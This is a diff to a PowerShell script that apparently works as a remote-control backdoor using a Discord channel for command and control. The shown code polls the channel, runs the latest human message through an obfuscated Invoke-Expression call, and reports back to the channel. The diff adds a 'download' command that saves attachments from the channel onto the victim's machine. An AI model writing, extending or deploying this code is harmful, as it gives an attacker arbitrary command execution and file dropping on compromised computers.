@@ -1200,11 +1200,18 @@ function PullMsg {
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", $headers.Authorization)
     $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
-    
     if ($response) {
         $most_recent_message = ($response | ConvertFrom-Json)[0]
         if (-not $most_recent_message.author.bot) {
             $response = $most_recent_message.content
+            $attachments = $most_recent_message.attachments
+           if ($response -eq 'download' -and $attachments) {
+                $attachment_url = $attachments[0].url
+                $file_name = [System.IO.Path]::GetFileName($attachment_url)
+                $file_name = $file_name.Split('?')[0]
+                Write-Host "Downloading File : $file_name"
+                $webClient.DownloadFile($attachment_url, $file_name)
+            }
             $script:response = $response
             $script:messages = $response
         }
@@ -1212,7 +1219,6 @@ function PullMsg {
         Write-Output "No messages found in the channel."
     }
 }
-
 
 function sendMsg {
     param(
@@ -1374,6 +1380,9 @@ while($true){
 		$InfoOnConnect = 0
                 sendMsg -Message ":pause_button: ``Session Paused..`` :pause_button:"
                 WaitingMsg
+            }
+	    if ($response -like "Download") {
+                $previouscmd = $response
             }
             elseif (!($response -like "$previouscmd")) {
                 $Result = ie`x($response) -ErrorAction Stop
